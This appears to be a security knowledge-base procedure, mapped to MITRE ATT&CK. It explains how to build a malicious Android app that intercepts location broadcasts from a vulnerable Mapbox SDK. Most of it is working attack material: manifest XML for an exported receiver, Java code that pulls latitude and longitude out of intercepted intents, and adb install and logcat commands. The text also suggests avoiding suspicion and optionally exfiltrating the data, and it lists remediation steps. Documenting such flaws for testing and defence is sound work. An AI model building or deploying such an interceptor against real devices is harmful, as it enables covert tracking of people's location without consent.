---
tags:
  - android
  - information-disclosure
  - broadcast-interception
  - malicious-app
type: procedure
tools:
  - '[[tools/Android-Debug-Bridge]]'
tactics:
  - '[[Collection]]'
  - '[[Initial Access]]'
commands:
  - '[[commands/adb-install-apk]]'
platforms:
  - Android
techniques:
  - '[[Adversary-in-the-Middle]]'
skill_level: intermediate
impact_level: low
detection_risk: medium
sub_techniques: []
id: f62fd507-c156-4d9b-bc0d-3c2898149c9f
created_at: '2025-12-14T17:24:42.113Z'
updated_at: '2025-12-14T17:24:42.113Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Adversary-in-the-Middle]]'
---
# Implement Malicious Broadcast Receiver for Interception

## Summary

This procedure details creating a malicious Android application that registers a BroadcastReceiver to intercept location data broadcasts from the vulnerable Mapbox SDK, exploiting the lack of process isolation to capture sensitive information like user coordinates without user consent or elevated privileges.

## Description

Exploiting the Mapbox Android SDK's use of global Broadcast Receivers, a malicious app can declare a matching intent filter in its manifest or register dynamically to receive location updates. Upon reception, the app extracts extras from the intent (e.g., latitude, longitude) and logs or exfiltrates them. This targets devices with the vulnerable SDK (v4.0-4.2.0) installed, assuming co-location on the same device. The attack requires building and installing the app via ADB, then triggering location services in the target app to generate broadcasts. Expected outcome: unauthorized access to location data, demonstrating the info disclosure risk.

## Requirements

1. Android Studio or equivalent IDE for app development
2. Knowledge of the vulnerable intent action from prior analysis (e.g., com.mapbox.LOCATION_UPDATE)
3. ADB access to the target Android device with USB debugging enabled
4. Target app using Mapbox SDK installed and granting location permissions

## Defense

Defensive measures and detection strategies:

- Update to Mapbox SDK v4.2.1+ which uses LocalBroadcastManager to scope broadcasts
- Avoid implicit intents; use explicit ones with component targeting
- Device-level protections like app sandboxing and permission reviews; monitor for suspicious receiver registrations via log analysis
- Use tools like MobSF for static analysis of installed apps to detect malicious receivers

## Objectives

1. Register a receiver to capture Mapbox location broadcasts
2. Extract and log sensitive location data from intercepted intents
3. Validate interception without detection on a shared device

## Instructions

### Step 1: Create Malicious App Project

**Context**: Set up an Android project with a BroadcastReceiver targeting the vulnerable intent.

In Android Studio, create a new empty project. Edit AndroidManifest.xml to declare the receiver:

```xml
<receiver android:name=".LocationInterceptorReceiver"
          android:exported="true">
    <intent-filter>
        <action android:name="com.mapbox.services.location.OnLocationChanged" />  <!-- Replace with actual action from analysis -->
    </intent-filter>
</receiver>
```

> This statically registers the receiver to listen globally; ensure the app requests no permissions to avoid suspicion.

### Step 2: Implement Receiver Logic

**Context**: Code the receiver to process incoming broadcasts and capture data.

Create LocationInterceptorReceiver.java (or Kotlin):

```java
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class LocationInterceptorReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null) {
            double lat = intent.getDoubleExtra("latitude", 0.0);
            double lon = intent.getDoubleExtra("longitude", 0.0);
            Log.d("Interceptor", "Intercepted Location: " + lat + ", " + lon);
            // Optionally exfiltrate via network
        }
    }
}
```

> Adjust extras keys based on analysis; use Logcat to view captured data post-interception.

### Step 3: Build and Install App

**Context**: Compile the APK and deploy to the target device to activate the receiver.

Build the project (Build > Build Bundle/APK > APK). Install using [[commands/adb-install-apk]]:

```bash
adb install ./app/build/outputs/apk/debug/app-debug.apk
```

> Ensure device is connected; post-install, launch the app briefly to register, then use the Mapbox app to trigger location requests.

### Step 4: Trigger and Verify Interception

**Context**: Generate broadcasts and confirm data capture.

Run `adb logcat | grep Interceptor` while using location features in the Mapbox app. Verify logs show location data.

> Success: Broadcasts received outside the Mapbox process, disclosing location without authorization.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]
- [[Initial Access]]

### Techniques

- [[Adversary-in-the-Middle]]

### Sub-Techniques


## Commands Used

- [[commands/adb-install-apk]]

## Tools Used

- [[tools/Android-Debug-Bridge]]

## Tags

- [[android]]
- [[information-disclosure]]
- [[broadcast-interception]]
